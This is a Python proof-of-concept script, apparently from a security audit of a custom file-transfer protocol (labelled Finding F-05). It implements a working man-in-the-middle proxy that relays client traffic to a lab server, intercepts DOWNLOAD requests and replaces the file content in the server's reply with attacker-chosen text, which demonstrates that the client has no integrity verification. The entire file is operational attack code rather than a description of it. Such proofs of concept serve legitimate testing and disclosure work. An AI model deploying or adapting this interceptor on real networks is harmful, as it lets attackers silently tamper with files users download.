#!/usr/bin/env python3
"""
mitm_F05.py - Fake Download Response Injection
Finding: F-05
Violated: R6
When the client sends a DOWNLOAD request, the MITM suppresses the real
server response and injects a fabricated response with attacker-controlled
content. The client accepts it without any verification.
"""

import socket
import threading
import json
import time

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9000
SERVER_HOST  = "10.0.0.3"
SERVER_PORT  = 9000

FAKE_CONTENT = "INJECTED BY MITM - this is not the real file content"


def forward_client_to_server(client_sock, server_sock, pending_download):
    buf = b""
    try:
        while True:
            chunk = client_sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode("utf-8"))
                    if obj.get("action") == "DOWNLOAD":
                        pending_download[0] = obj.get("filename", "unknown")
                        print(f"[F-05] DOWNLOAD request intercepted for '{pending_download[0]}'")
                except Exception:
                    pass
                server_sock.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            server_sock.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def forward_server_to_client(server_sock, client_sock, pending_download):
    buf = b""
    try:
        while True:
            chunk = server_sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode("utf-8"))
                    # If this is a DOWNLOAD response, replace content
                    if pending_download[0] and obj.get("status") == "ok" and "content" in obj:
                        real_content = obj["content"]
                        obj["content"] = FAKE_CONTENT
                        print(f"[F-05 INJECT] Replaced content for '{pending_download[0]}'")
                        print(f"  Real content  : {repr(real_content)}")
                        print(f"  Fake content  : {repr(FAKE_CONTENT)}")
                        pending_download[0] = None
                        line = json.dumps(obj).encode("utf-8")
                except Exception:
                    pass
                client_sock.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            client_sock.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def handle_connection(client_sock, client_addr):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Cannot connect to server: {e}")
        client_sock.close()
        return

    pending_download = [None]

    t1 = threading.Thread(target=forward_client_to_server, args=(client_sock, server_sock, pending_download), daemon=True)
    t2 = threading.Thread(target=forward_server_to_client, args=(server_sock, client_sock, pending_download), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[F-05] Download response injection active...")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
